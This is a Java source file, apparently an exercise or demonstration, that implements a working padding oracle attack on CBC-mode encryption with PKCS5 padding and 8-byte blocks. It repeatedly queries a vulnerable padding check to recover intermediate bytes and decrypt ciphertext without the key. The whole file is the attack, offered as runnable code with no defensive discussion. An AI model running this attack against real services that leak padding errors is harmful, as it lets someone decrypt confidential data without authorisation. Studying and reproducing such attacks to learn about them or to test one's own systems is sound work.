package paddingoracle;

public class Attack {
	final static int BLOCKSIZE = 8;

	byte[] paddingoracledecrypt(PaddingOracle vulnerable, byte[] ciphertexttobecracked) throws Exception {
		int length = ciphertexttobecracked.length;
		if (length % BLOCKSIZE != 0)
			throw new IllegalArgumentException();
		int blocks = length / BLOCKSIZE;
		byte[] plaintext = new byte[(blocks - 1) * BLOCKSIZE]; // REMOVE IV
		int decrypted_ptr = 0;
		int encrypted_ptr = 0;
		for (int blockno = 1; blockno < blocks; blockno++) {
			byte[] intermediate = paddingoracledecrypt(vulnerable, ciphertexttobecracked, blockno);
			for (int i = 0; i < BLOCKSIZE; i++) {
				plaintext[decrypted_ptr++] = (byte) ((ciphertexttobecracked[encrypted_ptr++] ^ intermediate[i]));
			}
		}
		return plaintext;
	}

	byte[] paddingoracledecrypt(PaddingOracle vulnerable, byte[] ciphertexttobecracked, int blockno) throws Exception {
		byte[] r = new byte[2 * BLOCKSIZE];
		System.arraycopy(ciphertexttobecracked, BLOCKSIZE * blockno, r, BLOCKSIZE, BLOCKSIZE);
		byte[] intermediatebytes = new byte[BLOCKSIZE];
		tryagain: for (int retries = 0; retries < BLOCKSIZE; retries++) {
			// clear all bytes unless last byte upon try again.
			if (retries > 0) {
				intermediatebytes[BLOCKSIZE - 1]++;
				for (int clear = 0; clear < BLOCKSIZE - 1; clear++)
					intermediatebytes[clear] = 0;
			}
			for (int attacksize = 1; attacksize <= BLOCKSIZE; attacksize++) {
				copyKnownIntermediateBytes(r, intermediatebytes);
				final int pkcs5padvalue = attacksize; // pkcs5: pad value is same as pad length
				pkcs5setLastIvBytesUsingXor(r, attacksize, pkcs5padvalue);
				final int intermediateByteToAttackIndex = BLOCKSIZE - attacksize;
				int i = intermediatebytes[intermediateByteToAttackIndex] & 0xFF; // zero unless tryagain
				//System.out.println("attacksize: " + attacksize + " i: " + i);
				while (!vulnerable.paddingOracle(r)) {
					i++;
					r[intermediateByteToAttackIndex] = (byte) i;
					if (i == 256) {
						if (attacksize == 1) {
							throw new RuntimeException(
									"All 256 values for byte tested without padding oracle return true");
						}
						// We found e.g. 0202 or 030303 when searching for 01. try again!
						//System.out.println("Try again! attacksize: " + attacksize);
						continue tryagain;
					}
				}
				final int intermediate = i ^ pkcs5padvalue;
				intermediatebytes[intermediateByteToAttackIndex] = (byte) intermediate;
				// System.out.println("Intermediate: "+ Arrays.toString(intermediatebytes));
			}
			break tryagain;
		}
		return intermediatebytes;
	}

	static void copyKnownIntermediateBytes(byte[] r, byte[] intermediatebytes) {
		System.arraycopy(intermediatebytes, 0, r, 0, BLOCKSIZE);
	}

	private static void pkcs5setLastIvBytesUsingXor(byte[] r, int attacksize, int pkcs5padvalue) {
		for (int j = BLOCKSIZE - attacksize + 1; j < BLOCKSIZE; j++) {
			r[j] ^= pkcs5padvalue;
		}
	}

}
